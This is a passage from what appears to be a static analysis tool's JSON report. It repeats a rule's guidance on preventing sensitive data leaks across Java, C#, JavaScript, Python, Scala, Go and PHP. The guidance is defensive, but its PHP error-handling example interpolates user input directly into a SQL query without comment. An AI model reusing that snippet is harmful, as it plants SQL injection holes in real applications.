(non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure",
                            "id": "database-to-log/94d6c9d6135654da69b2844b7b9b52dc",
                            "name": "Sensitive Data Leak: Security-Sensitive Data Is Leaked To Log In Login.js:handlelogin",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "3",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 3",
                                    "CWE 117",
                                    "CWE 200",
                                    "OWASP 2021 a01-broken-access-control",
                                    "OWASP a01-2021-broken-access-control",
                                    "OWASP a3-sensitive-data-exposure",
                                    "Sensitive Data Leak"
                                ]
                            },
                            "shortDescription": {
                                "text": "Sensitive Data Leak: Security-sensitive Data is Leaked to Log in Login.js:handleLogin"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive database data is written to log in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive database data is written to log in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive database data is written to log in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### 